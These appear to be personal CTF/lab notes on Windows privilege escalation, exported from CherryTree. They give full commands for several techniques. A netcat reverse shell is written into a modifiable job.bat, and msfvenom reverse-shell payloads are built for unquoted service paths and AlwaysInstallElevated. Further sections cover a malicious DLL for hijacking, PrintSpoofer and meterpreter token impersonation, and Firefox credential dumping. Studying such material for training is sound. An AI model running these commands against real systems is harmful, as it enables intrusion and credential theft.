<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Windows</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Windows</h1><br/><p><strong>A) Using winpeas</strong></p><p></p><p>Assuming we already have user privilege. Get the tool for Privilege Escalation.</p><p></p><p><a href="https://github.com/carlospolop/PEASS-ng/releases/download/refs%2Fpull%2F260%2Fmerge/winPEASx64.exe">https://github.com/carlospolop/PEASS-ng/releases/download/refs%2Fpull%2F260%2Fmerge/winPEASx64.exe</a></p><p></p><p>Run The web server in Attacker Machine to host the winPEASx64.exe:</p><p></p><p>python3 -m http.server 80</p><p></p><p>On Target Machine:</p><p></p><p>powershell </p><p>wget <a href="http://10.10.14.9/winPEASx64.exe">http://10.10.14.9/winPEASx64.exe</a> -outfile winPEASx64.exe</p><p></p><p><img src="images/25-1.png" alt="images/25-1.png" /></p><p></p><p>PS C:\Users\sql_svc\Downloads&gt; .\winPEASx64.exe</p><p>Note: The output of the tool is long, here you will see just the small(Important) part of the output.</p><p></p><p><img src="images/25-2.png" alt="images/25-2.png" /></p><p></p><p>We can navigate to the folder where the PowerShell history is stored:</p><p></p><p><img src="images/25-3.png" alt="images/25-3.png" /></p><p></p><p>To read the file, we will type type ConsoleHost_history.txt :</p><p></p><p><img src="images/25-4.png" alt="images/25-4.png" /></p><p></p><p></p><p>Thus, we get the password.</p><p></p><p></p><p><strong>B) Using a admin program that runs in a batch file.</strong></p><p></p><p><img src="images/25-5.png" alt="images/25-5.png" /></p><p></p><p>In the following job.bat uses an admin program but can be fully accessed by the user. We exploit this.</p><p></p><p><img src="images/25-6.png" alt="images/25-6.png" /></p><p></p><p>The purpose of job.bat seems to be related to clearing logfiles, and it can only be run with an</p><p>Administrator account. There is also mention of an executable named wevtutil , which upon further</p><p>investigation is determined to be a Windows command that has the ability to retrieve information about</p><p>event logs and publishers. It can also install and uninstall event manifests, run queries and export, archive</p><p>and clear logs. We now understand the use of it in this case, alongside the el and cl parameters found in</p><p>the job.bat file.</p><p></p><p></p><p>Since the file itself can only be run by an Administrator, we could try our luck and see if our usergroup could</p><p>at least edit the file, instead of running it, or if there are any mismatched permissions between the script</p><p>and the usergroup or file configuration. We can achieve this by using the icacls command.</p><p></p><p><img src="images/25-7.png" alt="images/25-7.png" /></p><p></p><p>Looking at the permissions of job.bat using icacls reveals that the group BUILTIN\Users has full</p><p>control (F) over the file. The BUILTIN\Users group represents all local users, which includes Daniel as</p><p>well. We might be able to get a shell by transferring netcat to the system and modifying the script to</p><p>execute a reverse shell.</p><p></p><p></p><p>Before then, we need to check if the wevtutil process mentioned in the job.bat file is running. We can</p><p>see the currently scheduled tasks by typing the schtasks command. If our permission level doesn&#39;t allow</p><p>us to view this list through Windows&#39; command line, we can quickly use powershell&#39;s ps command instead,</p><p>which represents another security misconfiguration that works against the server.</p><p></p><p></p><p><img src="images/25-8.png" alt="images/25-8.png" /></p><p></p><p></p><p></p><p>We can see that the process wevtutil is running, which is the same process listed in the job.bat file. This</p><p>indicates that the .bat script might be executing. (Required)</p><p></p><p>Because the target host does not have access to the Internet, we will need to deliver the nc64.exe</p><p>executable through our own connection with the target. In order to do so, we will first need to download</p><p>nc64.exe on our system, start up a Python HTTP server on one of our ports, then switch to the shell we</p><p>have on the host to issue a wget command with our address and the nc64.exe file residing on our server.</p><p>This will initialize a download from the host to our Python server for the executable. Make sure you don&#39;t</p><p>switch folders after downloading the executable. The Python HTTP server needs to be running in the same</p><p>directory as the location of the downloaded nc64.exe file we want to deliver to the target.</p><p></p><p></p><p>In order to download the executable on our system, we can use this link:</p><p><a href="https://github.com/int0x33/nc.exe/blob/master/nc64.exe">https://github.com/int0x33/nc.exe/blob/master/nc64.exe</a></p><p></p><p></p><p><img src="images/25-9.png" alt="images/25-9.png" /></p><p></p><p>Since we have full control over the job.bat script, we will modify its&#39; contents by running the following</p><p>command. Make sure to run it from the Windows Command Line, where the daniel@MARKUP user is</p><p>displayed before every command, and not from Windows PowerShell, where PS is displayed before every</p><p>command. As before, make sure to change the {your_IP} parameter with the IP address assigned to your</p><p>tun0 interface and the {port} parameter with a port of your choice, which you will listen for connections</p><p>on.</p><p></p><p>echo C:\Log-Management\nc64.exe -e cmd.exe {your_IP} {port} &gt; C:\Log-Management\job.bat</p><p></p><p></p><p>Then listen in netcat.</p><p></p><p><strong>THM:</strong></p><p></p><p><strong>Windows systems </strong>have different user privilege levels. Accounts can belong to regular users, who would only have enough privileges to log into the system. Some user levels you will most commonly see are listed below: </p><p>      ▪ <strong>Administrator (local):</strong> This is the user with the most privileges.</p><p>      ▪ <strong>Standard (local):</strong> These users can access the computer but can only perform limited tasks. Typically these users can not make permanent or essential changes to the system. </p><p>      ▪ <strong>Guest:</strong> This account gives access to the system but is not defined as a user. </p><p>      ▪ <strong>Standard (domain):</strong> Active Directory allows organizations to manage user accounts. A standard domain account may have local administrator  privileges. </p><p>      ▪ <strong>Administrator (domain):</strong> Could be considered as the most privileged user. It can edit, create, and delete other users throughout the organization&#39;s domain.</p><p></p><p>You may see some sources refer to &quot;<strong>SYSTEM</strong>&quot; as a privileged account. It is worth noting that &quot;<strong>SYSTEM</strong>&quot; is not an account in the proper sense. Windows and its services use the &quot;<strong>SYSTEM</strong>&quot; account to perform their tasks. Services installed on a Windows target system can use service accounts and will have a certain level of privilege, depending on the service using them. Service accounts do not allow you to log in but can be leveraged in other ways for privilege escalation. </p><p> </p><p><a href="https://camo.githubusercontent.com/eda971feea35d0dbda6e982c6132d0bff82c438482774d98c0d15eafa625813f/68747470733a2f2f7062732e7477696d672e636f6d2f6d656469612f44415a73453256555141415f62705a2e6a7067"><img src="images/25-10.png" alt="images/25-10.png" /></a></p><p></p><p>Typically, privilege escalation will require you to follow a methodology similar to the one given below: </p><p></p><p>   1. Enumerate the current user&#39;s privileges and resources it can access.</p><p>   2. If the antivirus software allows it, run an automated enumeration script such as winPEAS or PowerUp.ps1</p><p>   3. If the initial enumeration and scripts do not uncover an obvious strategy, try a different approach (e.g. manually go over a checklist like the one provided below)</p><p></p><p><strong>Checklist:</strong></p><p>https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md</p><p></p><p><strong>Local Prevelege Escalation Guide/Walkthrough for Windows/Linux in PDF:</strong></p><p>https://github.com/sagishahar/lpeworkshop</p><p></p><p><strong>Key Processes:</strong></p><p></p><p><strong>User Enumeration:</strong></p><p>The following commands will help us enumerate users and their privileges on the target system.</p><p></p><p>whoami /priv																:		Current user’s privileges</p><p>net users																		:		List Users</p><p>net user username 													:		List Details of a user</p><p>(e.g. net user Administrator)</p><p></p><p>qwinsta 																		:		Other users logged in simultaneously: </p><p>(the query session command can be used the same way) </p><p></p><p>net localgroup															:		User groups defined on the system</p><p>net localgroup groupname 										:		List members of a specific group</p><p>(e.g. net localgroup Administrators)</p><p></p><p><strong>Collecting system information:</strong></p><p>systeminfo																	:		Returns overview of the target system</p><p>(e.g. systeminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot;)</p><p>hostname																	:		Returns name of the system</p><p></p><p><strong>Searching Processes:</strong></p><p>tasklist 																		:		Lists all running processes (tasklist /v : For verbose output)</p><p></p><p><strong>Searching files:</strong></p><p>findstr																			:		Command can be used to find files containing a string.</p><p></p><p>eg.</p><p><em><strong>findstr /si password *.txt</strong></em></p><p>	-	findstr: Searches for patterns of text in files.</p><p>	-	/si: Searches the current directory and all subdirectories (s), ignores upper case / lower case differences (i)</p><p>	-	password: The command will search for the string “password” in files</p><p>	-	*.txt: The search will cover files that have a .txt extension. eg “.txt”, “.xml”, “.ini”, “*.config”, and “.xls”</p><p>	</p><p><strong>Patch Level:</strong></p><p>Microsoft regularly releases updates and patches for Windows systems. A missing critical patch on the target system can be an easily exploitable ticket to privilege escalation. The command below can be used to list updates installed on the target system.</p><p></p><p><em><strong>wmic qfe get Caption,Description,HotFixID,InstalledOn</strong></em></p><p></p><p>Deprecated in Windows 10, version 21H1 (2021 First Release). Now moved to WMI PowerShell cmdlet</p><p></p><p><strong>Network Connections:</strong></p><p></p><p><em><strong>netstat -ano</strong></em></p><p></p><p>-a: Displays all active connections and listening ports on the target system.</p><p>-n: Prevents name resolution. IP Addresses and ports are displayed with numbers instead of attempting to resolves names using DNS.</p><p>-o: Displays the process ID using each listed connection. </p><p></p><p>Note: Any port listed as “LISTENING” that was not discovered with the external port scan can present a potential local service.</p><p></p><p><strong>Scheduled Tasks:</strong></p><p>Some tasks may be scheduled to run at predefined times. If they run with a privileged account (e.g. the System Administrator account) and the executable they run can be modified by the current user you have, an easy path for privilege escalation can be available.</p><p></p><p><em><strong>schtasks /query /fo LIST /v</strong></em></p><p></p><p><strong>Drivers:</strong></p><p>The <strong>driverquery</strong> command will list drivers installed on the target system. You will need to do some online research about the drivers listed and see if any presents a potential privilege escalation vulnerability.</p><p></p><p>driverquery</p><p></p><p><strong>Antivirus:</strong></p><p></p><p>Typically, you can take two approaches to check for antivirus: (a)looking for the antivirus specifically or (b)listing all running services and checking which ones may belong to antivirus software.</p><p></p><p>(a)The first approach may require some research beforehand to learn more about service names used by the antivirus software. For example, the default antivirus installed on Windows systems, Windows Defender’s service name is windefend. The query below will search for a service named “windefend” and return its current state.</p><p></p><p><em><strong>sc query windefend</strong></em></p><p></p><p>(b)While the second approach will allow you to detect antivirus software without prior knowledge about its service name, the output may be overwhelming.</p><p></p><p><em><strong>sc queryex type=service</strong></em></p><p></p><p><strong>Using Automated Tools:</strong></p><p></p><p><strong>1) WinPEAS</strong></p><p>WinPEAS is a script developed to enumerate the target system to uncover privilege escalation paths. You can find more information about winPEAS and download either the precompiled executable or a .bat script. Please note, Windows Defender detects and disables winPEAS. WinPEAS will run commands similar to the ones listed in the previous task and print their output. The output from winPEAS can be lengthy and sometimes difficult to read. This is why it would be good practice to always redirect the output to a file, as shown below:</p><p></p><p></p><p><em><strong>winpeas.exe &gt; outputfile.txt</strong></em></p><p></p><p>https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS</p><p></p><p><strong>2) PowerUp</strong></p><p>PowerUp is a PowerShell script that searches common privilege escalation on the target system. You can run it with the <strong>Invoke-AllChecks</strong> option that will perform all possible checks on the target system or use it to conduct specific checks (e.g. the <strong>Get-UnquotedService</strong> option to only look for potential unquoted service path vulnerabilities).</p><p></p><p>https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc</p><p></p><p><em><strong>Note:</strong></em> To run PowerUp on the target system, you may need to bypass the execution policy restrictions. To achieve this, you can launch PowerShell using the command below</p><p></p><p><em>C:\Users\user\Desktop&gt;</em><em><strong>powershell.exe -nop -exec bypass</strong></em><em></em></p><p><em>Windows PowerShell</em></p><p><em>Copyright (C) Microsoft Corporation. All rights reserved.</em></p><p><em></em></p><p><em>PS C:\Users\user\Desktop&gt; </em><em><strong>Import-Module .\PowerUp.ps1</strong></em><em></em></p><p><em>PS C:\Users\user\Desktop&gt; </em><em><strong>Invoke-AllChecks</strong></em><em></em></p><p><em></em></p><p><em>[*] Running Invoke-AllChecks</em></p><p><em></em></p><p><em>[*] Checking if user is in a local group with administrative privileges...</em></p><p></p><p></p><p><strong>3) Windows Exploit Suggester</strong></p><p>Some exploit suggesting scripts (e.g. winPEAS) will require you to upload them to the target system and run them there. This may cause antivirus software to detect and delete them. To avoid making unnecessary noise that can attract attention, you may prefer to use Windows Exploit Suggester, which will run on your attacking machine (e.g. Kali or TryHackMe AttackBox).</p><p></p><p>https://github.com/AonCyberLabs/Windows-Exploit-Suggester</p><p></p><p>Once installed, and before you use it, type the <strong>windows-exploit-suggester.py –update</strong> command to update the database. The script will refer to the database it creates to check for missing patches that can result in a vulnerability you can use to elevate your privileges on the target system.</p><p></p><p><strong>Important:</strong> To use the script, you will need to run the systeminfo command on the target system. Do not forget to direct the output to a .txt file you will need to move to your attacking machine. (Say sysinfo_output.txt)</p><p>On Target Machine.</p><p><em><strong>systeminfo &gt; sysinfo_output.txt</strong></em></p><p>Send this txt file to attacker.</p><p></p><p>Once this is done, windows-exploit-suggester.py can be run as follows;</p><p>On Attacker Machine.</p><p><em><strong>windows-exploit-suggester.py --database 2021-09-21-mssb.xls --systeminfo sysinfo_output.txt</strong></em></p><p></p><p><strong>4) Metasploit</strong></p><p></p><p>If you already have a Meterpreter shell on the target system, you can use the <strong>multi/recon/local_exploit_suggester</strong> module to list vulnerabilities that may affect the target system and allow you to elevate your privileges on the target system.</p><p></p><p></p><p><strong>Using Vulnerable Software:</strong></p><p></p><p>Software installed on the target system can present various privilege escalation opportunities. As with drivers, organizations and users may not update them as often as they update the operating system. You can use the wmic tool seen previously to list software installed on the target system and its versions. The command below will dump information it can gather on installed software.</p><p></p><p><em><strong>wmic product</strong></em></p><p></p><p>This output is not easy to read, and depending on the screen size over which you have access to the target system; it can seem impossible to find anything useful. You could filter the output to obtain a cleaner output with the command below.</p><p></p><p><em><strong>wmic product get name,version,vendor</strong></em></p><p></p><p>Be careful; due to some backward compatibility issues (e.g. software written for 32 bits systems running on 64 bits), the wmic product command may not return all installed programs. The target machine attached to this task will provide you with some hints. You will see shortcuts for installed software, and you will notice they do not appear in the results of the wmic product command. Therefore, It is worth checking running services using the command below to have a better understanding of the target system.</p><p></p><p><em><strong>wmic service list brief</strong></em></p><p></p><p>As the output of this command can be overwhelming, you can grep the output for running services by adding a findstr command as shown below.</p><p></p><p><em><strong>wmic service list brief | findstr  &quot;Running&quot;</strong></em></p><p></p><p>If you need more information on any service, you can simply use the sc qc command as seen below. </p><p></p><p>To List all services using sc</p><p></p><p><strong>sc query state=all</strong></p><p></p><p>eg. </p><p><em>C:\Users\user&gt;</em><em><strong>sc qc RemoteMouseService</strong></em><em></em></p><p><em>[SC] QueryServiceConfig SUCCESS</em></p><p><em></em></p><p><em>SERVICE_NAME: RemoteMouseService</em></p><p><em>        TYPE               					: 10  WIN32_OWN_PROCESS</em></p><p><em>        START_TYPE         			: 2   AUTO_START</em></p><p><em>        ERROR_CONTROL      		: 1   NORMAL</em></p><p><em>        BINARY_PATH_NAME   	: C:\Program Files (x86)\Remote Mouse\RemoteMouseService.exe</em></p><p><em>        LOAD_ORDER_GROUP   	:</em></p><p><em>        TAG               					: 0</em></p><p><em>        DISPLAY_NAME       		: RemoteMouseService</em></p><p><em>        DEPENDENCIES       		:</em></p><p><em>        SERVICE_START_NAME 	: LocalSystem</em></p><p><em></em></p><p><em>C:\Users\user&gt; </em></p><p>The above contains &quot;Unquoted Service Path&quot; vulnerability that can be used for prevelege escalation using google/searchploit etc/</p><p></p><p><strong>Using DLL Hijacking:</strong></p><p> DLL hijacking is an effective technique that can allow you to inject code into an application. Some Windows executables will use Dynamic Link Libraries (DLLs) when running. We think of DLLs as files that store additional functions that support the main function of the .exe file. In a way, DLLs are executable files, but they can not be run directly like an exe file. They should be launched by other applications (or exe in most cases). If we can switch the legitimate DLL file with a specially crafted DLL file, our code will be run by the application. DLL hijacking requires an application (typically an exe file) that either has a missing DLL file, or where the search order can be used to insert the malicious DLL file.</p><p></p><p>A DLL Hijacking scenario consists of replacing a legitimate DLL file with a malicious DLL file that will be called by the executable and run. By this point, you may have an idea about the specific conditions required for a successful DLL hijacking attack. These can be summarized as;</p><p></p><p>   1) An application that uses one or more DLL files.</p><p>   2) A way to manipulate these DLL files. </p><p>   3) The application should not be able to find the legitimate DLL before our modified DLL.(Check Search Order Below)</p><p></p><p></p><p>Search Order######</p><p>If SafeDllSearchMode is enabled, the search order is as follows:</p><p></p><p>    1-The directory from which the application loaded</p><p>    2-The system directory. Use the GetSystemDirectory function to get the path of this directory.</p><p>    3-The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched.</p><p>    4-The Windows directory. Use the GetWindowsDirectory function to get the path of this directory.</p><p>    5-The current directory.</p><p>    6-The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the App Paths registry key. The App Paths key is not used when computing the DLL search path.</p><p></p><p>If SafeDllSearchMode is disabled, the search order is as follows:</p><p></p><p>    1-The directory from which the application loaded.</p><p>    2-The current directory.</p><p>    3-The system directory. Use the GetSystemDirectory function to get the path of this directory.</p><p>    4-The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched.</p><p>    5-The Windows directory. Use the GetWindowsDirectory function to get the path of this directory.</p><p>    6-The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the App Paths registry key. The App Paths key is not used when computing the DLL search path.</p><p></p><p>The tool you can use to find potential DLL hijacking vulnerabilities is <strong>Process Monitor (ProcMon)</strong>. As ProcMon will require administrative privileges to work</p><p></p><p><strong>Skeleton Code for the Malicious DLL:     </strong></p><p>           </p><p><em><strong>#include &lt;windows.h&gt;</strong></em></p><p><em><strong></strong></em></p><p><em><strong>BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {</strong></em></p><p><em><strong>    if (dwReason == DLL_PROCESS_ATTACH) {</strong></em></p><p><em><strong>        system(&quot;cmd.exe /k whoami &gt; C:\\Temp\\dll.txt&quot;);</strong></em></p><p><em><strong>        ExitProcess(0);</strong></em></p><p><em><strong>    }</strong></em></p><p><em><strong>    return TRUE;</strong></em></p><p><em><strong>}</strong></em></p><p></p><p> </p><p>Then compile it:</p><p><em><strong>x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll</strong></em></p><p></p><p>Then copy the malicious dll to the location where the application is searching for.</p><p></p><p>To send the dll file to target machine. Host a web sever.</p><p>In target powershell: <strong>wget -O hijackme.dll ATTACKBOX_IP:PORT/hijackme.dll</strong></p><p></p><p></p><p>Finally Stop and Start the Service</p><p></p><p><em><strong>sc stop dllsvc &amp; sc start dllsvc</strong></em></p><p></p><p><strong>Note:</strong> This service is an example which is running on thm box. Nomrally, we need to find the service that is searching for a dll using the process monitor tool or similar.</p><p></p><p></p><p><strong>Using Unquoted Service Path:</strong></p><p></p><p><em><strong>wmic service get name,displayname,pathname,startmode</strong></em></p><p></p><p>This will list services with path name for us to inspect.</p><p>Once we find an intresting serviive without quotes. We can further inspect it by following.</p><p></p><p><em><strong>sc qc servicename</strong></em></p><p><em><strong>sc query servicename</strong></em></p><p></p><p><em><strong>eg. sc qc unquotedsvc</strong></em></p><p></p><p><img src="images/25-11.png" alt="images/25-11.png" /></p><p></p><p>Once we have confirmed that the binary path is unquoted, we will need to check our privileges on folders in the path. Our goal is to find a folder that is writable by our current user. We can use accesschk.exe with the command below to check for our privileges.</p><p></p><p><strong>.\accesschk64.exe /accepteula -uwdq &quot;C:\Program Files\&quot;</strong></p><p><strong>.\accesschk64.exe /accepteula -uwdq &quot;C:\Program Files\Unquoted Path Service&quot;</strong></p><p></p><p><strong>Note:</strong> We need to sent this executable to the target machine</p><p></p><p><img src="images/25-12.png" alt="images/25-12.png" /></p><p></p><p></p><p>From above we see normal user have write access inside the <strong>&quot;C:\Program Files\Unquoted Path Service&quot;</strong> folder</p><p>Once we know we have write access, use msfvenom to create a payload that has the name of the folder before space(<strong>Common.exe</strong>). We copy it inside the “<strong>C:\Program Files\Unquoted Path Service</strong>” directory.</p><p></p><p><strong>msfvenom -p windows/x64/shell_reverse_tcp  LHOST=10.11.72.31 LPORT=7777 -f exe &gt; </strong><em><strong>Common.exe</strong></em></p><p></p><p>Once the payload is ready. We can start the service.</p><p></p><p><em><strong>sc start unquotedsvc</strong></em></p><p></p><p>Then finally listen to the reverse shell.</p><p></p><p></p><p><strong>Using Token Impersonation:(Research Further)</strong></p><p></p><p>Works before windows server 2019 and windows 10</p><p></p><p>Uses the &quot;SeImpersonatePrivilege&quot;</p><p>Can be checked by <em><strong>whoami /priv</strong></em></p><p></p><p>A high preveleged service is subjected to internal MITM attack. Then the token is impersonated for other services eg, samba, rpc</p><p></p><p>Examples:</p><p></p><p>Hot Potato - SMB</p><p>Rotten potato - RPC</p><p>Lonely Potato</p><p>Juicy Potato</p><p></p><p><strong>Note:</strong> Hot Potato is full internal while others might require to create a server on the network.</p><p></p><p></p><p>Windows uses tokens to ensure that accounts have the right privileges to carry out particular actions. Account tokens are assigned to an account when users log in or are authenticated. This is usually done by LSASS.exe(think of this as an authentication process).</p><p></p><p>This access token consists of:</p><p></p><p>    user SIDs(security identifier)</p><p>    group SIDs</p><p>    privileges</p><p></p><p>There are two types of access tokens:</p><p></p><p>    -	primary access tokens: those associated with a user account that are generated on log on</p><p>    -	impersonation tokens: these allow a particular process(or thread in a process) to gain access to resources using the token of another (user/client) process</p><p>    </p><p>For an impersonation token, there are different levels:</p><p></p><p>    SecurityAnonymous: current user/client cannot impersonate another user/client</p><p>    SecurityIdentification: current user/client can get the identity and privileges of a client, but cannot impersonate the client</p><p>    SecurityImpersonation: current user/client can impersonate the client&#39;s security context on the local system</p><p>    SecurityDelegation: current user/client can impersonate the client&#39;s security context on a remote system</p><p></p><p>where the security context is a data structure that contains users&#39; relevant security information.</p><p></p><p>The privileges of an account(which are either given to the account  when created or inherited from a group) allow a user to carry out  particular actions. Here are the most commonly abused privileges:</p><p>• SeImpersonatePrivilege</p><p>• SeAssignPrimaryPrivilege</p><p>• SeTcbPrivilege</p><p>• SeBackupPrivilege</p><p>• SeRestorePrivilege</p><p>• SeCreateTokenPrivilege</p><p>• SeLoadDriverPrivilege</p><p>• SeTakeOwnershipPrivilege</p><p>• SeDebugPrivilege</p><p></p><p>Check privileges with “<em><strong>whoami /priv</strong></em>” Or on meterpreter use “<em><strong>getprivs</strong></em>”</p><p><strong>SeDebugPrivilege, SeImpersonatePrivilege</strong> are the ones that help to escalate the privelege. Both are enabled here.</p><p></p><p><strong>In the meterpreter:</strong></p><p><em><strong>load incognito</strong></em><strong>	</strong>			:		Loads the Incognito extention of meterpreter used for token impersonation</p><p><em><strong>list_tokens -g</strong></em>				:		It will list all available tokens</p><p></p><p><em><strong>impersonate_token BUILTIN\Administrators</strong></em><em>	</em>	:	This will impersonate the Administrator token</p><p></p><p>Verify with <em><strong>getuid</strong></em></p><p></p><p>We are now <em><strong>NT AUTHORITY\SYSTEM</strong></em> as token but we still need a high privelege process.</p><p>ideally migrate to a high privelege process. <em><strong>eg.lsass.exe or services.exe</strong></em></p><p></p><p>use <em><strong>ps</strong></em> command to show all process.</p><p><em><strong>getpid</strong></em> to show our current process ID.</p><p><em><strong>migrate PID</strong></em> to go to a high privelege process</p><p></p><p>Now we have successfully elevated the priveleges.</p><p></p><p><strong>Some Other General Methods:</strong></p><p></p><p><strong>1) Scheduled Tasks</strong></p><p></p><p>Can be run by <strong>schtask</strong> command, already discussed earlier for a bit.</p><p></p><p>if any deleted binary or binary that can be modified by us is running with higher prevelege, this can be exploited.</p><p></p><p></p><p><strong>2)	 AlwaysInstallElevated</strong></p><p></p><p>We can check in resgistry if windows msi installer has high prevelege. If so we can use msfvenom and exploit this.</p><p></p><p>Check:</p><p><strong>reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer</strong></p><p><strong>reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer</strong></p><p></p><p><strong>Note: </strong>Both the key has to be set. </p><p>If both set, we msfvenom to get a msi file.</p><p><em><strong>msfvenom -p windows/x64/shell_reverse_tcpLHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi</strong></em></p><p></p><p>Then, send to target system and run as following.</p><p><em><strong>C:\Users\user\Desktop&gt;msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi</strong></em></p><p></p><p><strong>3) Passwords</strong></p><p></p><p><strong>A-&gt;Saved credentials:</strong> Windows allows us to use other users&#39; credentials. This function also gives the option to save these credentials on the system. The command below will list saved credentials.</p><p></p><p><em><strong>cmdkey /list</strong></em></p><p></p><p>If you see any credentials worth trying, you can use them with the <strong>runas</strong> command and the <strong>/savecred</strong> option, as seen below.</p><p></p><p><em><strong>runas /savecred /user:admin reverse_shell.exe</strong></em></p><p></p><p><strong>B-&gt;Registry keys:</strong> Registry keys potentially containing passwords can be queried using the commands below.</p><p></p><p><em><strong>reg query HKLM /f password /t REG_SZ /s</strong></em></p><p><em><strong>reg query HKCU /f password /t REG_SZ /s</strong></em></p><p></p><p><strong>C-&gt;Unattend files:</strong> Unattend.xml files helps system administrators setting up Windows systems. They need to be deleted once the setup is complete but can sometimes be forgotten on the system. What you will find in the <strong>unattend.xml</strong> file can be different according to the setup that was done. If you can find them on a system, they are worth reading. </p><p></p><p></p><p></p><p></p><p><strong>Using Token Impersonation:(Example)</strong></p><p></p><p>It uses <strong>SeImpersonatePrivilege</strong> and requires it to be enabled.</p><p></p><p><em><strong>https://github.com/itm4n/PrintSpoofer</strong></em></p><p></p><p>We download the <em><strong>PrintSpoofer64.exe</strong></em> from the github release.</p><p></p><p>We upload it to the server using smb.</p><p><em><strong>put PrintSpoofer64.exe</strong></em></p><p>We find the location in our revershell using the <em><strong>“net share”</strong></em> command that lists all windows shares.</p><p></p><p><strong>Or </strong></p><p></p><p>Any other method. eg <em>Powershell File Download after creating a local web server in attacker machine</em>.</p><p></p><p>We go to the location and run:</p><p><em><strong>Printspoofer64.exe -i -c cmd.exe</strong></em></p><p></p><p><img src="images/25-13.png" alt="images/25-13.png" /></p><p></p><p></p><p></p><p><strong>Using Firefox dump:</strong></p><p></p><p>It is required that <strong>firefox</strong> is running on the target machine and we have a captures <strong>meterpreter session</strong>.</p><p></p><p>We use a msfconsole post exploit tool to dump the credentials.</p><p></p><p>use post/multi/gather/firefox_creds</p><p></p><p>Give session id as option</p><p></p><p>run</p><p></p><p></p><p>We will get the files in loot folder.</p><p><img src="images/25-14.png" alt="images/25-14.png" /></p><p></p><p>Now go to the locations of loot and copy/move the files with their actual names.</p><p>After move/copy the following should be the contents.</p><p><img src="images/25-15.png" alt="images/25-15.png" /></p><p></p><p>Then get the <strong>firefox_decrypt</strong> from github. <strong>https://github.com/unode/firefox_decrypt</strong></p><p></p><p>Then run it inside the dump folder using.</p><p></p><p><strong>python /opt/firefox_decrypt/firefox_decrypt.py .</strong></p><p></p><p></p><p><img src="images/25-16.png" alt="images/25-16.png" /></p><p></p><p>As we can see, we got username and password. Its actually <strong>admin</strong> user.</p></div>
</body>
</html>
